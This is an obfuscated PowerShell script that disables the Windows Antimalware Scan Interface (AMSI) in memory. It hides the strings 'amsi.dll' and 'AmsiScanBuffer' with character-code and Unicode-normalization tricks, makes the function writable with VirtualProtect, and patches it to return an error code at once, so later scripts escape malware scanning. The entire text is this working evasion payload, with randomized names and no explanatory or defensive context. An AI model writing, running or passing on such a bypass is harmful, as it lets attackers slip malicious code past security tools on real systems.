$PXRjG4hiicnllPjAmN = @"
using System;
using System.Runtime.InteropServices;
public class PXRjG4hiicnllPjAmN {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr WgwyG, string E_wfsFm5);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr BonDVf8JkQf3xiBxja, UIntPtr HwZULsxpMjQo68M1f, uint eXNC, out uint rueU);
}
"@

Add-Type $PXRjG4hiicnllPjAmN

$qEnDoGeTN = [PXRjG4hiicnllPjAmN]::LoadLibrary("$(('áms'+'í.d'+'ll').NORmaLIze([chaR](70+48-48)+[cHaR]([bYte]0x6f)+[cHaR]([byte]0x72)+[char](109)+[cHar](68*57/57)) -replace [chAr]([bYTE]0x5c)+[ChAR](112+89-89)+[Char](123)+[cHAr](77)+[chAr](110)+[Char](125*11/11))")
$Ci5b4fIS9A = [PXRjG4hiicnllPjAmN]::GetProcAddress($qEnDoGeTN, "$(('ÃmsìScánBùff'+'ér').NORMalIze([CHAr]([BYTe]0x46)+[CHar](98+13)+[char](114+110-110)+[cHaR]([BytE]0x6d)+[cHar](7+61)) -replace [chAr]([Byte]0x5c)+[cHAR]([BYte]0x70)+[ChAr]([bYTe]0x7b)+[cHar](77)+[cHAR](110+80-80)+[chaR](125+116-116))")
$p = 0
[PXRjG4hiicnllPjAmN]::VirtualProtect($Ci5b4fIS9A, [uint32]5, 0x40, [ref]$p)
$tfNFm23LLPPrg1uR1xD = "0xB8"
$k7W5IsjlWBXxer829Dd = "0x57"
$O3E = "0x00"
$BoQ5P_U = "0x07"
$VRTMMoKHIvsP = "0x80"
$pNouexGHHsdqa = "0xC3"
$D43HD_y2 = [Byte[]] ($tfNFm23LLPPrg1uR1xD,$k7W5IsjlWBXxer829Dd,$O3E,$BoQ5P_U,+$VRTMMoKHIvsP,+$pNouexGHHsdqa)
[System.Runtime.InteropServices.Marshal]::Copy($D43HD_y2, 0, $Ci5b4fIS9A, 6)